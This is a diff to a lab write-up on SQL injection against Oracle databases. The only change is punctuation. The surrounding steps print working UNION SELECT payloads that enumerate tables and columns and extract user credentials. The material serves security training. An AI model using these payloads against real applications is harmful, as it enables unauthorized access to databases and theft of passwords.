@@ -10,7 +10,7 @@
 This lab demonstrated how SQL Injection can be used to retrieve data from Oracle Databases.
 
 ## 🛠 Steps to Solve
-1. Determine the number of columns present by injecting `'+UNION+SELECT+'abc','def'+FROM+DUAL--`
+1. Determine the number of columns present by injecting `'+UNION+SELECT+'abc','def'+FROM+DUAL--`.
 2. Injecting `'+UNION+SELECT+table_name,+NULL+FROM+all_tables--` to retrieve the list of tables in the database.
 3. Injecting `'+UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name='users_abcdef'--` to retrieve the details of the columns in the table (replacing the table name).
 4. Injecting `'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--` to retrieve the usernames and passwords of all users (replacing the table and column names).
